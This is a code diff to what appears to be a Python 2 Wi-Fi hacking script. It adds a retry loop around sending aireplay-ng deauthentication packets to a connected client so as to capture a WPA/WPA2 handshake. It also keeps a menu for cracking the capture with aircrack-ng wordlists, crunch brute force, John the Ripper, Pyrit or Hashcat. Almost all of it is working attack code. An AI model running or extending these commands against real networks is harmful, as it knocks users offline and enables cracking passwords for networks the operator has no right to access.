@@ -43,24 +43,31 @@ ch = raw_input("Enter the channel on which the network is listening -> ")
 cmd = "xterm -hold -e \"airodump-ng -w capture_file --bssid %s -c %s mon0\" &" %(bssid, ch)
 os.system(cmd)
 
-# WPA/WPA2 Hacking
-if(enc == "WPA" or enc == "WPA2" or enc == "wpa" or enc == "wpa2"): 
+def client_send():
 	client = raw_input("Enter the BSSID (STATION) of a client connected to the network -> ")
 	cmd = "aireplay-ng -0 10 -a %s -c %s mon0" %(bssid, client)
-
-	for count in range(1,24):
+ 
+	for count in range(1,15):
 		os.system(cmd)
 
 	print colored("[WARNING] Check if \"WPA Handshake\" appeared in the other shell. Otherwise it is useless to go on!\n", 'red')
-	time.sleep(3)
-	print "\n[*] Choose how to crack encrypted data: "
-	print "\t1) Wordlist"
-	print "\t2) BruteForce (Crunch with letters and numbers)"
-	print "\t3) JTR"
-	print "\t4) JTR+Pyrit" 
-	print "\t5) JTR+Aircrack"
-	print "\t6) Hashcat"
-	choice = raw_input("\t-> ")
+	time.sleep(1)
+
+# WPA/WPA2 Hacking
+if(enc == "WPA" or enc == "WPA2" or enc == "wpa" or enc == "wpa2"): 
+	retry = "y"
+	while(retry == "y" or retry == "Y" or retry == "yes"):
+		client_send()
+		retry = raw_input("Do you want to try with another connected client? [necessary if handshake did not appear] (y/n) ")
+
+	print "\n[*] Choose how to crack encrypted data: \n"
+	print "  1) Wordlist"
+	print "  2) BruteForce (Crunch with letters and numbers)"
+	print "  3) JTR"
+	print "  4) JTR+Pyrit"  
+	print "  5) JTR+Aircrack"
+	print "  6) Hashcat"
+	choice = raw_input("  -> ")
 
 	if(choice == "1"):
 		cmd = "aircrack-ng capture_file-01.cap -w ./wordlist.lst"
